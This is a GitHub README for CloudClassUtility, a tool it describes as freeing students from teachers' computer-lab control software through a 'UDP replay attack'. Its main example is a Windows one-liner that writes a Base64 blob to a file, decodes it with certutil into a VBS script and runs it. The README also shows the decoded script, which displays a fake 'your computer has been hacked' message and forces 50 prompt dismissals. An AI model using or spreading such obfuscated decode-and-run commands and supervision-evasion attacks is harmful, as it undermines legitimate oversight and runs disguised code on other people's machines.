<div align="center">

# CloudClassUtility

[![Build status](https://ci.appveyor.com/api/projects/status/5utm8n3uw2ej8nbt?svg=true)](https://ci.appveyor.com/project/Cookie987/cloudclassutility)

[![GitHub release (latest by date)](https://img.shields.io/github/v/release/Cookie987/CloudClassUtility?logo=github)](https://github.com/Cookie987/CloudClassUtility/releases)
[![GitHub Release Date](https://img.shields.io/github/release-date/Cookie987/CloudClassUtility)](https://github.com/Cookie987/CloudClassUtility/releases/latest)
[![Github stable release downloads](https://img.shields.io/github/downloads/Cookie987/CloudClassUtility/latest/total.svg?label=downloads&logo=github&cacheSeconds=600)](https://github.com/Cookie987/CloudClassUtility/releases/latest)

[![GitHub tag (latest SemVer pre-release)](https://img.shields.io/github/v/tag/Cookie987/CloudClassUtility?color=orange&include_prereleases&label=preview&sort=date&logo=github)](https://github.com/Cookie987/CloudClassUtility/tags)
[![GitHub (Pre-)Release Date](https://img.shields.io/github/release-date-pre/Cookie987/CloudClassUtility?label=preview%20date)](https://github.com/Cookie987/CloudClassUtility/releases)
[![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/downloads-pre/Cookie987/CloudClassUtility/latest/total?label=downloads&logo=github)](https://github.com/Cookie987/CloudClassUtility/releases)

[![License](https://img.shields.io/github/license/Cookie987/CloudClassUtility.svg?label=License&logo=gnu)](https://github.com/Cookie987/CloudClassUtility/blob/main/LICENSE.md)

[![Alt](https://repobeats.axiom.co/api/embed/bd418cb285929486c83bfa7e797eff5ac913da33.svg "Repobeats analytics image")](https://github.com/Cookie987/CloudClassUtility)
</div>

CloudClassUtility 是一个多功能的微机课辅助程序, 可以让您解除老师的控制. 通过此程序, 您可以完成许多高级操作, 例如通过 "UDP 重放攻击" 配合 `Base64` 就能实现很多效果, 例如

```bash
echo bXNnYm94ICLE47XEtefE1NLRvq2xuyA/Pz8gutrByyIKZGltIHMKZG8gdW50aWwgcz01MApzPXMrMQptc2dib3ggIrj4ztKwtDUwtM672LO1sMkiLDY0Cmxvb3A= > .\---.txt && certutil -decode .\---.txt .\---.vbs && start ---.vbs
```
表示

```vbnet
msgbox "你的电脑已经被 ??? 黑了"
dim s
do until s=50
s=s+1
msgbox "给我按50次回车吧",64
loop
```